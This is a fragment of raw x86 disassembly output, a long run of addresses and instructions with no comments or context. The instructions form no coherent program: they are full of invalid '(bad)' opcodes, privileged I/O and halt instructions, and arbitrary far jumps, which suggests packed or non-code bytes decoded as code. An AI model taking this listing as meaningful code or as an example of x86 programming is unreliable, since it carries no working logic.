  4456b5:	popf   
  4456b6:	pop    es
  4456b7:	loope  0x4456c0
  4456b9:	stc    
  4456ba:	ins    BYTE PTR es:[edi],dx
  4456bb:	fs jmp 0xe8c2:0xdb15eeb2
  4456c3:	add    al,0xdf
  4456c5:	sahf   
  4456c6:	neg    ecx
  4456c8:	je     0x4456d2
  4456ca:	add    DWORD PTR [edi+0x413d838f],esp
  4456d0:	mov    al,0xc3
  4456d2:	mov    edi,0x2a8a700
  4456d7:	add    BYTE PTR [edx-0x4e],ah
  4456da:	jnp    0x445719
  4456dc:	add    ebx,0xdd634064
  4456e2:	pop    ebx
  4456e3:	add    BYTE PTR [edx-0x4e],ah
  4456e6:	sbb    eax,0xa6b7ba19
  4456eb:	idiv   DWORD PTR [ebp+0x5f0e1e2e]
  4456f1:	push   es
  4456f2:	cmc    
  4456f3:	sub    BYTE PTR [edi],0x9c
  4456f6:	cmc    
  4456f7:	jbe    0x445759
  4456f9:	xchg   edi,eax
  4456fa:	repz out 0xd7,eax
  4456fd:	pop    ebx
  4456fe:	pushf  
  4456ff:	mul    DWORD PTR [ecx+0x6200c29c]
  445705:	mov    dl,0x1e
  445707:	sbb    eax,0xeac26fdb
  44570c:	dec    cx
  44570e:	ret    0x8383
  445711:	stos   BYTE PTR es:[edi],al
  445712:	cmp    edx,0x82f9bd5e
  445718:	imul   edi,DWORD PTR [ecx-0x25b5eee2],0x73
  44571f:	scas   al,BYTE PTR es:[edi]
  445720:	dec    ebp
  445721:	mov    ebx,0xcb48812b
  445726:	aam    0xfd
  445728:	cmp    eax,0x35a54e51
  44572d:	xchg   edi,eax
  44572e:	push   eax
  44572f:	sub    BYTE PTR [ecx],dh
  445731:	mov    ebx,0xdf6f7937
  445736:	call   0x56c55779
  44573b:	popf   
  44573c:	loopne 0x4457a1
  44573e:	xchg   esi,eax
  44573f:	daa    
  445740:	aas    
  445741:	js     0x44571c
  445743:	out    0x3,eax
  445745:	bound  ecx,QWORD PTR [esi-0x5b]
  445748:	loopne 0x4457a6
  44574a:	sub    DWORD PTR [eax-0x1785c8fe],0x3
  445751:	bound  edi,QWORD PTR [edx]
  445753:	fstp   DWORD PTR [ebx-0x5b10393e]
  445759:	loope  0x445797
  44575b:	into   
  44575c:	cld    
  44575d:	push   edi
  44575e:	repnz iret 
  445760:	push   eax
  445761:	les    edi,FWORD PTR [edx-0x66683f29]
  445767:	call   0xf281b96f
  44576c:	jp     0x44570e
  44576e:	cwde   
  44576f:	sar    bh,cl
  445771:	jmp    0xb256:0x65a26b98
  445778:	div    BYTE PTR [esi]
  44577a:	into   
  44577b:	push   0xffffffaa
  44577d:	imul   eax,DWORD PTR [ebp-0x1a],0xffffff9b
  445781:	push   eax
  445782:	ret    
  445783:	xchg   edi,eax
  445784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445785:	mov    eax,ds:0x8db0c5b1
  44578a:	mov    edx,0xd8583e63
  44578f:	and    al,0xe1
  445791:	loopne 0x4457a7
  445793:	retf   
  445794:	add    DWORD PTR [ecx+0x582c0192],esp
  44579a:	fld    DWORD PTR [eax]
  44579c:	jmp    0x3c92b8a1
  4457a1:	or     cl,BYTE PTR [edi+0x6c]
  4457a4:	inc    ecx
  4457a5:	call   0xe945daee
  4457aa:	popa   
  4457ab:	inc    edx
  4457ac:	adc    BYTE PTR [ecx+0x78],al
  4457af:	(bad)  
  4457b0:	test   BYTE PTR [esi-0x1e],0x43
  4457b4:	(bad)  
  4457b6:	xchg   DWORD PTR [edi],esp
  4457b8:	jmp    0xf7064bf2
  4457bd:	sub    al,BYTE PTR [edx+edi*2]
  4457c0:	add    ecx,ebp
  4457c2:	popa   
  4457c3:	inc    ebp
  4457c4:	cmp    al,0x70
  4457c6:	and    ebx,DWORD PTR [eax-0x67771215]
  4457cc:	or     BYTE PTR [eax],0xf6
  4457cf:	push   esi
  4457d0:	sti    
  4457d1:	cmc    
  4457d2:	inc    esp
  4457d3:	mov    ebx,0xc1bc09de
  4457d8:	imul   BYTE PTR [edx]
  4457da:	loop   0x44579a
  4457dc:	add    al,0x74
  4457de:	fbstp  TBYTE PTR [ecx-0x3dfe2334]
  4457e4:	ret    0xec6a
  4457e7:	shr    BYTE PTR [ebx-0x7],cl
  4457ea:	fdivr  QWORD PTR [edi+0x56bd5501]
  4457f0:	clc    
  4457f1:	icebp  
  4457f2:	or     bl,0xe8
  4457f5:	test   eax,0xaaf6c1cb
  4457fa:	fnstsw WORD PTR [esi+0x566d3406]
  445800:	clc    
  445801:	icebp  
  445802:	add    BYTE PTR [ebp-0x45],dh
  445805:	ficomp WORD PTR [ecx-0x15]
  445808:	shl    esi,0xaa
  44580b:	mov    dh,0x75
  44580d:	repz mov es,ecx
  445810:	dec    ebp
  445811:	cmp    al,0x0
  445813:	adc    esp,0xff82333
  445819:	and    al,BYTE PTR [edx]
  44581b:	mov    eax,0x7fccbda8
  445820:	sbb    eax,0xdd4bfff5
  445825:	add    BYTE PTR [eax],al
  445827:	cmp    ebx,ebp
  445829:	add    BYTE PTR [eax],al
  44582b:	ja     0x44584a
  44582d:	cmc    
  44582e:	(bad)  
  44582f:	mov    ebx,0xbbfff6b3
  445834:	xchg   edi,eax
  445835:	cli    
  445836:	(bad)  
  445837:	cmp    ebx,ebp
  445839:	add    BYTE PTR [eax],al
  44583b:	cmp    ebx,ebp
  44583d:	add    BYTE PTR [eax],al
  44583f:	mov    eax,ds:0x77fff527
  445844:	lods   eax,DWORD PTR ds:[esi]
  445845:	idiv   bh
  445847:	stos   DWORD PTR es:[edi],eax
  445848:	mov    edx,0xdcfbfffa
  44584d:	add    BYTE PTR [eax],al
  44584f:	or     ebx,ebp
  445851:	add    BYTE PTR [eax],al
  445853:	cmp    ebp,esi
  445855:	hlt    
  445856:	push   edi
  445858:	scas   eax,DWORD PTR es:[edi]
  445859:	idiv   bh
  44585b:	das    
  44585c:	xchg   esi,eax
  44585d:	cli    
  44585e:	dec    ebx
  445860:	fadd   QWORD PTR [eax]
  445862:	add    bl,cl
  445864:	fadd   QWORD PTR [eax]
  445866:	add    BYTE PTR [eax],al
  445868:	dec    ebp
  445869:	lock hlt 
  44586b:	(bad)  
  44586c:	mov    ebx,0x63fff6ac
  445871:	mov    edx,0xdccbfffa
  445876:	add    BYTE PTR [eax],al
  445878:	mov    ebx,0x690000dc
  44587d:	repz hlt 
  44587f:	call   FWORD PTR [edi-0x50]
  445882:	idiv   bh
  445884:	arpl   WORD PTR [edx-0x23840006],di
  44588a:	add    BYTE PTR [eax],al
  44588c:	(bad)  
  44588e:	add    al,BYTE PTR [eax]
  445890:	bound  ecx,QWORD PTR [edx]
  445892:	cmp    ah,bh
  445894:	jne    0x445894
  445896:	in     eax,dx
  445897:	jmp    FWORD PTR [ebp+0x16]
  44589a:	loope  0x445897
  44589c:	gs ret 0x2
  4458a0:	(bad)  
  4458a2:	add    al,BYTE PTR [eax]
  4458a4:	bound  esi,QWORD PTR [ebx+edi*1-0x10ddb204]
  4458ab:	inc    DWORD PTR [ebp-0x5e]
  4458ae:	inc    edx
  4458af:	cld    
  4458b0:	cmp    eax,0x620002c2
  4458b5:	ret    0x2
  4458b8:	bound  ecx,QWORD PTR [eax]
  4458ba:	cmp    edi,esp
  4458bc:	and    eax,0x1dfff866
  4458c1:	call   0x2:0xc215fbd4
  4458c8:	(bad)  
  4458ca:	add    al,BYTE PTR [eax]
  4458cc:	add    BYTE PTR [edx+0x10],ah
  4458cf:	cmp    bh,ah
  4458d1:	std    
  4458d2:	cmc    
  4458d3:	icebp  
  4458d4:	push   ebp
  4458d6:	sub    ebx,esp
  4458d8:	sti    
  4458d9:	in     eax,dx
  4458da:	rol    DWORD PTR [edx],0x0
  4458dd:	(bad)  
  4458df:	add    al,BYTE PTR [eax]
  4458e1:	(bad)  
  4458e2:	clc    
  4458e3:	xor    al,0xfc
  4458e5:	aad    0x6d
  4458e7:	out    dx,al
  4458e8:	dec    ebp
  4458ea:	std    
  4458eb:	(bad)  
  4458ec:	sti    
  4458ed:	(bad)
  4458f0:	add    BYTE PTR [edx-0x3e],ah
  4458f3:	add    al,BYTE PTR [eax]
  4458f5:	bound  ebp,QWORD PTR [edi+esi*1]
  4458f8:	cld    
  4458f9:	lods   eax,DWORD PTR ds:[esi]
  4458fa:	sub    ebp,ebp
  4458fc:	jmp    DWORD PTR [ebp-0x62042037]
  445902:	rol    DWORD PTR [edx],0x0
  445905:	(bad)  
  445906:	(bad)  
  445908:	add    esp,DWORD PTR [edx-0x27]
  44590b:	and    DWORD PTR ds:0xf76cb786,edi
  445911:	jge    0x4458ca
  445913:	(bad)  
  445915:	jns    0x4458ce
  445917:	call   0xe81dbb1f
  44591c:	add    esp,DWORD PTR [edx-0x27]
  44591f:	gs cmp eax,0xf520b75e
  445925:	push   ebp
  445926:	mov    bh,0x54
  445928:	loopne 0x445973
  44592a:	mov    bh,0xe8
  44592c:	add    esp,DWORD PTR [edx-0x27]
  44592f:	out    0x3,eax
  445931:	add    BYTE PTR [edx-0x27],ah
  445934:	pop    ds
  445935:	cmp    eax,0xf500b736
  44593a:	sub    eax,0x29de90b7
  44593f:	mov    bh,0xe8
  445941:	add    esp,DWORD PTR [edx-0x27]
  445944:	out    0x3,eax
  445946:	(bad)  
  445947:	(bad)  ds:0x4b70e3d
  44594d:	hlt    
  44594e:	add    eax,0xfe43f8b7
  445953:	mov    dh,0xe8
  445955:	add    esp,DWORD PTR [edx-0x27]
  445958:	out    0x3,eax
  44595a:	(bad)  
  44595b:	fstp   DWORD PTR [ebx+0x40]
  44595e:	out    0xb6,al
  445960:	xchg   esp,eax
  445961:	stc    
  445962:	fnsave [esi-0x49261f60]
  445968:	call   0xe81dbb70
  44596d:	add    esp,DWORD PTR [edx-0x27]
  445970:	mov    ecx,0x54b6be3f
  445975:	div    BYTE PTR [ebp+0x6203e8b6]
  44597b:	(bad)  
  44597d:	add    esp,DWORD PTR [edx-0x27]
  445980:	add    cl,ch
  445982:	popa   
  445983:	fld    DWORD PTR [eax]
  445985:	jmp    0xe94532eb
  44598a:	popa   
  44598b:	fld    DWORD PTR [eax]
  44598d:	pop    es
  44598e:	dec    edx
  44598f:	mov    ch,0xf6
  445991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445992:	xor    BYTE PTR [ebp+0x30008bf6],dh
  445998:	mov    ch,0xf6
  44599a:	jnp    0x4459cc
  44599c:	mov    ch,0xf6
  44599e:	jmp    0xdc3b0ed2
  4459a3:	xchg   edi,eax
  4459a4:	mov    ch,0xf6
  4459a6:	ret    
  4459a7:	(bad)  
  4459a8:	mov    ch,0xf6
  4459aa:	daa    
  4459ab:	xchg   esp,eax
  4459ac:	mov    ch,0xf6
  4459ae:	mov    ecx,0xcbf6b58f
  4459b3:	ja     0x44596a
  4459b5:	not    bh
  4459b7:	outs   dx,DWORD PTR ds:[esi]
  4459b8:	mov    ch,0xf6
  4459ba:	jae    0x445a33
  4459bc:	mov    ch,0xf6
  4459be:	mov    DWORD PTR [edi-0x4b],ebp
  4459c1:	idiv   BYTE PTR [ebx+0x57]
  4459c4:	mov    ch,0xf6
  4459c6:	sbb    eax,0xbf6b54f
  4459cb:	push   edi
  4459cc:	mov    ch,0xf6
  4459ce:	and    ecx,DWORD PTR [edi-0x4b]
  4459d1:	idiv   bl
  4459d3:	ss mov ch,0xf6
  4459d6:	ret    
  4459d7:	cs mov ch,0xf6
  4459da:	mov    bl,0x36
  4459dc:	mov    ch,0xf6
  4459de:	xchg   DWORD PTR [esi],ebp
  4459e0:	mov    ch,0xf6
  4459e2:	push   edi
  4459e3:	xchg   esi,eax
  4459e4:	mov    ch,0xf6
  4459e6:	xor    ecx,DWORD PTR [esi-0x6e40094b]
  4459ec:	mov    ch,0xf6
  4459ee:	rcl    DWORD PTR [ecx+0x71d1f6b5],1
  4459f4:	mov    ch,0xf6
  4459f6:	sti    
  4459f7:	ins    DWORD PTR es:[edi],dx
  4459f8:	mov    ch,0xf6
  4459fa:	add    BYTE PTR [eax],al
  4459fc:	xor    eax,0x67fff4f1
  445a01:	icebp  
  445a02:	hlt    
  445a03:	call   DWORD PTR [edi]
  445a05:	in     al,dx
  445a06:	hlt    
  445a07:	push   DWORD PTR [ebp-0xf]
  445a0a:	hlt    
  445a0b:	inc    DWORD PTR [ecx-0x7a000b13]
  445a11:	in     eax,dx
  445a12:	hlt    
  445a13:	dec    DWORD PTR [ebx-0x22ffff27]
  445a19:	repz hlt 
  445a1b:	jmp    FWORD PTR [ecx+0x4bfff4ef]
  445a21:	repz hlt 
  445a23:	call   FWORD PTR [ecx-0xd]
  445a26:	hlt    
  445a27:	(bad)  
  445a28:	sti    
  445a29:	div    ah
  445a2b:	call   FWORD PTR [ebx-0x11]
  445a2e:	hlt    
  445a2f:	call   DWORD PTR [ebx-0xd]
  445a32:	hlt    
  445a33:	call   ecx
  445a35:	div    ah
  445a37:	dec    DWORD PTR [ebx-0x27]
  445a3a:	add    BYTE PTR [eax],al
  445a3c:	and    eax,0xb1fff4f1
  445a41:	cmc    
  445a42:	hlt    
  445a43:	(bad)  
  445a44:	fcomi  st,st(0)
  445a46:	hlt    
  445a47:	jmp    DWORD PTR [ebp-0x4e000b0b]
  445a4d:	cmc    
  445a4e:	hlt    
  445a4f:	(bad)  
  445a50:	(bad)  
  445a52:	hlt    
  445a53:	push   DWORD PTR [ecx-0x44000b10]
  445a59:	lock hlt 
  445a5b:	(bad)  
  445a5c:	mov    edi,0xfff4f0
  445a61:	and    esi,ecx
  445a63:	hlt    
  445a64:	jmp    DWORD PTR [ebx-0x4c000b10]
  445a6a:	lock hlt 
  445a6c:	call   ebx
  445a6e:	lock hlt 
  445a70:	jmp    FWORD PTR [ecx+0x62fff4eb]
  445a76:	push   0x2f
  445a78:	cld    
  445a79:	mov    ch,0xc2
  445a7b:	add    al,BYTE PTR [eax]
  445a7d:	bound  edx,QWORD PTR [ebx+edi*1-0x4]
  445a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445a82:	ret    0x2
  445a85:	(bad)
  445a8a:	inc    edx
  445a8b:	dec    ecx
  445a8c:	cld    
  445a8d:	lea    esi,[esi]
  445a8f:	dec    ecx
  445a90:	cld    
  445a91:	test   DWORD PTR [edx],esp
  445a93:	dec    ecx
  445a94:	cld    
  445a95:	jge    0x445ab5
  445a97:	dec    ecx
  445a98:	cld    
  445a99:	jne    0x445aa3
  445a9b:	dec    ecx
  445a9c:	cld    
  445a9d:	ins    DWORD PTR es:[edi],dx
  445a9e:	push   0x49
  445aa0:	cld    
  445aa1:	gs dec esp
  445aa3:	dec    ecx
  445aa4:	cld    
  445aa5:	pop    ebp
  445aa6:	dec    esp
  445aa7:	dec    ecx
  445aa8:	cld    
  445aa9:	push   ebp
  445aaa:	xor    al,0x49
  445aac:	cld    
  445aad:	dec    ebp
  445aae:	scas   al,BYTE PTR es:[edi]
  445aaf:	cmp    al,0xfc
  445ab1:	inc    ebp
  445ab2:	mov    ah,0x3c
  445ab4:	cld    
  445ab5:	cmp    eax,0x35fc3ed6
  445aba:	cmp    BYTE PTR [esp+edi*8],0x2d
  445abe:	jp     0x445afc
  445ac0:	cld    
  445ac1:	and    eax,0xfc3c6e
  445ac6:	sbb    eax,0x15fc3c38
  445acb:	pusha  
  445acc:	cmp    al,0xfc
  445ace:	or     eax,0x5fc3c0c
  445ad3:	add    BYTE PTR [esp+edi*8],bh
  445ad6:	std    
  445ad7:	in     eax,dx
  445ad8:	cmp    edi,esp
  445ada:	cmc    
  445adb:	mov    bl,0x3d
  445add:	cld    
  445ade:	in     eax,dx
  445adf:	fnstsw WORD PTR [ebx]
  445ae1:	cld    
  445ae2:	in     eax,0xa1
  445ae4:	aas    
  445ae5:	cld    
  445ae6:	frstor [edi+0x3f]
  445ae9:	cld    
  445aea:	aad    0x55
  445aec:	aas    
  445aed:	cld    
  445aee:	int    0xd8
  445af0:	inc    ecx
  445af1:	inc    ebp
  445af2:	(bad)  
  445af3:	mov    bl,0x52
  445af5:	inc    ebp
  445af6:	mov    esi,0xb64552b3
  445afb:	mov    bl,0x6e
  445afd:	inc    ebp
  445afe:	scas   al,BYTE PTR es:[edi]
  445aff:	mov    bl,0x90
  445b01:	inc    ebp
  445b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445b03:	mov    bl,0x74
  445b05:	inc    ebp
  445b06:	sahf   
  445b07:	mov    bl,0x98
  445b09:	inc    ebp
  445b0a:	xchg   esi,eax
  445b0b:	mov    bl,0xca
  445b0d:	inc    ebp
  445b0e:	mov    ?,WORD PTR [ebx-0x4c79ba60]
  445b14:	clc    
  445b15:	dec    ebx
  445b16:	jle    0x445acb
  445b18:	ret    0x764b
  445b1b:	mov    bl,0xd2
  445b1d:	dec    ebx
  445b1e:	outs   dx,BYTE PTR ds:[esi]
  445b1f:	mov    bl,0x2e
  445b21:	dec    esp
  445b22:	data16 mov bl,0x22
  445b25:	dec    esp
  445b26:	pop    esi
  445b27:	mov    bl,0xfc
  445b29:	dec    ebx
  445b2a:	add    BYTE PTR [esi-0x4d],dl
  445b2d:	bound  ecx,QWORD PTR [esi+ecx*2-0x4d]
  445b31:	or     BYTE PTR [esi+eax*2-0x4d],0x90
  445b36:	dec    esp
  445b37:	ds mov bl,0x8c
  445b3a:	dec    esp
  445b3b:	ss mov bl,0x14
  445b3e:	dec    esp
  445b3f:	cs mov bl,0x20
  445b42:	dec    esp
  445b43:	es mov bl,0x3e
  445b46:	dec    esp
  445b47:	push   ds
  445b48:	mov    bl,0x2c
  445b4a:	dec    esp
  445b4b:	push   ss
  445b4c:	mov    bl,0xda
  445b4e:	dec    edx
  445b4f:	push   cs
  445b50:	mov    bl,0xc4
  445b52:	dec    edx
  445b53:	push   es
  445b54:	mov    bl,0xce
  445b56:	dec    edx
  445b57:	(bad)  
  445b58:	mov    dl,0xb8
  445b5a:	dec    edx
  445b5b:	div    BYTE PTR [edx-0x4d11b55a]
  445b61:	mov    cs,WORD PTR [edx-0x1a]
  445b64:	mov    dl,0x66
  445b66:	dec    ebx
  445b67:	fidiv  WORD PTR [edx-0x4ad6b4ff]
  445b6d:	div    BYTE PTR [edi]
  445b6f:	sbb    DWORD PTR [ebp-0x4ae7500a],esi
  445b75:	test   bl,0x28
  445b78:	mov    ch,0xf6
  445b7a:	shr    DWORD PTR [eax],1
  445b7c:	mov    ch,0xf6
  445b7e:	stc    
  445b7f:	sbb    esi,DWORD PTR [ebp-0x4ae4180a]
  445b85:	idiv   cl
  445b87:	sub    esi,DWORD PTR [ebp-0x4ad7de0a]
  445b8d:	not    BYTE PTR [ecx]
  445b8f:	add    BYTE PTR [eax],bl
  445b91:	mov    ch,0xf6
  445b93:	pop    ss
  445b94:	sbb    BYTE PTR [ebp-0x4ad7e00a],dh
  445b9a:	idiv   BYTE PTR [ebx+0x2b]
  445b9d:	mov    ch,0xf6
  445b9f:	dec    ecx
  445ba0:	sbb    esi,DWORD PTR [ebp-0x4ae4a80a]
  445ba6:	idiv   BYTE PTR ds:0x93f6b5ab
  445bac:	stos   DWORD PTR es:[edi],eax
  445bad:	mov    ch,0xf6
  445baf:	mov    edi,0xfbf6b58c
  445bb4:	test   BYTE PTR [ebp-0x4a5ed00a],dh
  445bba:	div    BYTE PTR [edi]
  445bbc:	mov    eax,ds:0xa157f6b5
  445bc1:	mov    ch,0xf6
  445bc3:	mul    DWORD PTR [eax-0x5ef4094b]
  445bc9:	mov    ch,0xf6
  445bcb:	std    
  445bcc:	mov    al,ds:0xa0abf6b5
  445bd1:	mov    ch,0xf6
  445bd3:	(bad)  
  445bd4:	mov    al,ds:0xa08df6b5
  445bd9:	mov    ch,0xf6
  445bdb:	ins    DWORD PTR es:[edi],dx
  445bdc:	mov    al,ds:0xa075f6b5
  445be1:	mov    ch,0xf6
  445be3:	add    BYTE PTR [edi-0x60000ae9],dl
  445be9:	pop    ss
  445bea:	cmc    
  445beb:	inc    DWORD PTR [ebx+0x5bfff517]
  445bf1:	pop    ss
  445bf2:	cmc    
  445bf3:	inc    DWORD PTR [eax]
  445bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445bf6:	sbb    esi,ebp
  445bf8:	dec    edi
  445bfa:	sbb    esi,ebp
  445bfc:	push   DWORD PTR [ebx+0x67fff51b]
  445c02:	sbb    esi,ebp
  445c04:	jmp    FWORD PTR [ecx+0x49fff51b]
  445c0a:	sbb    esi,ebp
  445c0c:	(bad)  
  445c0d:	cmp    eax,0x5dfff51b
  445c12:	sbb    esi,ebp
  445c14:	inc    DWORD PTR [ebx+0x1b]
  445c17:	cmc    
  445c18:	dec    DWORD PTR ds:0xf1fff51b
  445c1e:	sbb    dh,ch
  445c20:	jmp    DWORD PTR ds:0xd1fff51b
  445c26:	lock hlt 
  445c28:	(bad)  
  445c29:	fcomip st,st(1)
  445c2b:	hlt    
  445c2c:	dec    DWORD PTR [edi-0x8000ae9]
  445c32:	pop    ss
  445c33:	cmc    
  445c34:	call   FWORD PTR [ecx-0x3c000ae9]
  445c3a:	pop    ss
  445c3b:	cmc    
  445c3c:	push   DWORD PTR [edi]
  445c3e:	sbb    ch,dh
  445c40:	jmp    DWORD PTR [edi+0x18]
  445c43:	cmc    
  445c44:	jmp    DWORD PTR [edi]
  445c46:	sbb    ch,dh
  445c48:	inc    ebp
  445c4a:	pop    ss
  445c4b:	cmc    
  445c4c:	(bad)  
  445c4d:	stc    
  445c4e:	pop    ss
  445c4f:	cmc    
  445c50:	jmp    DWORD PTR ds:0xc1fff518
  445c56:	pop    ss
  445c57:	cmc    
  445c58:	inc    DWORD PTR [eax]
  445c5a:	jnp    0x445c74
  445c5c:	cmc    
  445c5d:	jmp    DWORD PTR [edx+0x22]
  445c60:	ds cld 
  445c62:	in     eax,dx
  445c63:	or     BYTE PTR [esi],bh
  445c65:	cld    
  445c66:	in     eax,0x2
  445c68:	ds cld 
  445c6a:	fst    st(4)
  445c6c:	cmp    eax,0x3de0d5fc
  445c71:	cld    
  445c72:	int    0xa6
  445c74:	aas    
  445c75:	cld    
  445c76:	(bad)
  445c79:	cld    
  445c7a:	mov    ebp,0xb5fc36a8
  445c7f:	in     al,0x40
  445c81:	cld    
  445c82:	lods   eax,DWORD PTR ds:[esi]
  445c83:	rol    BYTE PTR [eax-0x4],cl
  445c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445c87:	add    al,BYTE PTR [ecx-0x4]
  445c8a:	popf   
  445c8b:	rol    BYTE PTR [eax-0x4],cl
  445c8e:	xchg   ebp,eax
  445c8f:	mov    BYTE PTR [eax-0x4],0x8d
  445c93:	repnz inc eax
  445c95:	cld    
  445c96:	test   DWORD PTR [edx+0x36],eax
  445c99:	cld    
  445c9a:	jge    0x445cd0
  445c9c:	ss cld 
  445c9e:	jne    0x445cb6
  445ca0:	ss cld 
  445ca2:	ins    DWORD PTR es:[edi],dx
  445ca3:	and    BYTE PTR [esi],dh
  445ca5:	cld    
  445ca6:	gs push 0x505dfc36
  445cac:	ss cld 
  445cae:	push   ebp
  445caf:	pop    esp
  445cb0:	ss cld 
  445cb2:	dec    ebp
  445cb3:	inc    eax
  445cb4:	ss cld 
  445cb6:	inc    ebp
  445cb7:	test   al,0x41
  445cb9:	cld    
  445cba:	cmp    eax,0xfc3fdc
  445cbf:	xor    eax,0x2dfc3fd6
  445cc4:	test   BYTE PTR [ecx-0x4],al
  445cc7:	and    eax,0x1dfc4154
  445ccc:	mov    ds:0xc215fc41,al
  445cd1:	add    al,BYTE PTR [eax]
  445cd3:	bound  eax,QWORD PTR [esi]
  445cd5:	aaa    
  445cd6:	cld    
  445cd7:	add    eax,0xfe3e61d9
  445cdc:	scas   eax,DWORD PTR es:[edi]
  445cdd:	ds imul BYTE PTR ds:[edi-0x269dfc18]
  445ce5:	fild   WORD PTR [ebx]
  445ce7:	bound  ebx,QWORD PTR [ecx-0x1a]
  445cea:	add    esp,DWORD PTR [edx+0x59]
  445ced:	jmp    0x6203:0xe1596203
  445cf4:	pop    ecx
  445cf5:	call   0x901dbefd
  445cfa:	xor    bh,BYTE PTR [esi-0x49cd8551]
  445d00:	scas   eax,DWORD PTR es:[edi]
  445d01:	dec    esi
  445d02:	xor    ch,BYTE PTR [esi+0x6203e8af]
  445d08:	fld    DWORD PTR [ebx+0x32]
  445d0b:	sahf   
  445d0c:	scas   eax,DWORD PTR es:[edi]
  445d0d:	sbb    dh,BYTE PTR [edx]
  445d0f:	xchg   esi,eax
  445d10:	scas   eax,DWORD PTR es:[edi]
  445d11:	and    al,0x32
  445d13:	mov    gs,WORD PTR [edi-0x5079ce12]
  445d19:	(bad)  
  445d1a:	xor    DWORD PTR [esi-0x51],edi
  445d1d:	in     al,dx
  445d1e:	xor    DWORD PTR [esi-0x51],esi
  445d21:	loopne 0x445d54
  445d23:	add    BYTE PTR [esi-0x51],ch
  445d26:	test   BYTE PTR [edi],ch
  445d28:	scas   ax,WORD PTR es:[edi]
  445d2a:	jp     0x445d5b
  445d2c:	pop    esi
  445d2d:	scas   eax,DWORD PTR es:[edi]
  445d2e:	jle    0x445d5f
  445d30:	push   esi
  445d31:	scas   eax,DWORD PTR es:[edi]
  445d32:	xchg   edx,eax
  445d33:	das    
  445d34:	dec    esi
  445d35:	scas   eax,DWORD PTR es:[edi]
  445d36:	sahf   
  445d37:	das    
  445d38:	inc    esi
  445d39:	scas   eax,DWORD PTR es:[edi]
  445d3a:	call   0x362f:0x76af3e2f
  445d41:	scas   eax,DWORD PTR es:[edi]
  445d42:	bound  ebp,QWORD PTR [edi]
  445d44:	cs scas eax,DWORD PTR es:[edi]
  445d46:	(bad)  
  445d47:	cs es scas eax,DWORD PTR es:[edi]
  445d4a:	into   
  445d4b:	cs push ds
  445d4d:	scas   eax,DWORD PTR es:[edi]
  445d4e:	mov    al,ds:0x1af162e
  445d53:	out    0x61,eax
  445d55:	fld    DWORD PTR [eax-0x952cb03]
  445d5b:	add    eax,0xedf6ad4d
  445d60:	inc    esp
  445d61:	lods   eax,DWORD PTR ds:[esi]
  445d62:	not    BYTE PTR [ebx]
  445d64:	xor    ch,BYTE PTR [ebp-0x52ca000a]
  445d6a:	mul    BYTE PTR [ecx]
  445d6c:	xchg   edx,eax
  445d6d:	lods   eax,DWORD PTR ds:[esi]
  445d6e:	mul    BYTE PTR ds:0x45f6ad92
  445d74:	xchg   edx,eax
  445d75:	lods   eax,DWORD PTR ds:[esi]
  445d76:	imul   BYTE PTR [ebx-0x1609528c]
  445d7c:	popa   
  445d7d:	fld    DWORD PTR [eax]
  445d7f:	jmp    0xc83b0af6
  445d84:	jae    0x445d33
  445d86:	imul   BYTE PTR [ebp-0x9528d00]
  445d8c:	lods   eax,DWORD PTR ds:[esi]
  445d8d:	push   ebx
  445d8e:	lods   eax,DWORD PTR ds:[esi]
  445d8f:	imul   cl
  445d91:	popa   
  445d92:	fld    DWORD PTR [eax]
  445d94:	and    DWORD PTR [eax],ebx
  445d96:	lods   eax,DWORD PTR ds:[esi]
  445d97:	div    ch
  445d99:	sbb    ebp,DWORD PTR [ebp-0x52d4320a]
  445d9f:	idiv   cl
  445da1:	sub    ebp,DWORD PTR [ebp-0x52e4160a]
  445da7:	not    BYTE PTR [edi-0x700952e4]
  445dad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445dae:	lods   eax,DWORD PTR ds:[esi]
  445daf:	not    BYTE PTR [edi-0x52095264]
  445db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445db6:	lods   eax,DWORD PTR ds:[esi]
  445db7:	div    BYTE PTR ds:0x89f6ad9c
  445dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445dbe:	lods   eax,DWORD PTR ds:[esi]
  445dbf:	neg    bl
  445dc1:	pushf  
  445dc2:	lods   eax,DWORD PTR ds:[esi]
  445dc3:	test   bl,0xa4
  445dc6:	lods   eax,DWORD PTR ds:[esi]
  445dc7:	neg    BYTE PTR [edi+0xf6ad9c]
  445dcd:	retf   
  445dce:	push   ss
  445dcf:	cmc    
  445dd0:	jmp    ebp
  445dd2:	pop    ds
  445dd3:	cmc    
  445dd4:	call   DWORD PTR [edi+0x43fff520]
  445dda:	and    ch,dh
  445ddc:	jmp    DWORD PTR [edi+0x43fff520]
  445de2:	and    ch,dh
  445de4:	(bad)  
  445de5:	std    
  445de6:	and    ch,dh
  445de8:	(bad)  
  445de9:	out    dx,eax
  445dea:	and    ch,dh
  445dec:	inc    DWORD PTR [eax]
  445dee:	test   eax,0xa5fff520
  445df3:	and    ch,dh
  445df5:	call   FWORD PTR [ecx-0x12000b17]
  445dfb:	pop    ds
  445dfc:	cmc    
  445dfd:	(bad)  
  445dfe:	jge    0x445e16
  445e00:	cmc    
  445e01:	jmp    DWORD PTR [edi]
  445e03:	push   ss
  445e04:	cmc    
  445e05:	(bad)  
  445e06:	cmp    edx,DWORD PTR [esi]
  445e08:	cmc    
  445e09:	jmp    FWORD PTR [ebx]
  445e0b:	push   ss
  445e0c:	cmc    
  445e0d:	push   ecx
  445e0f:	adc    eax,0x15c9fff5
  445e14:	cmc    
  445e15:	push   ebx
  445e17:	adc    eax,0x15c9fff5
  445e1c:	cmc    
  445e1d:	jmp    FWORD PTR [ecx]
  445e1f:	in     al,0xf4
  445e21:	inc    DWORD PTR ds:0xf9fff4e4
  445e27:	jecxz  0x445e1d
  445e29:	jmp    FWORD PTR [ecx-0x17]
  445e2c:	hlt    
  445e2d:	jmp    FWORD PTR [ecx-0x1a]
  445e30:	hlt    
  445e31:	jmp    FWORD PTR [edi-0x1a]
  445e34:	hlt    
  445e35:	(bad)  
  445e36:	jns    0x445e1e
  445e38:	hlt    
  445e39:	dec    DWORD PTR [ebx]
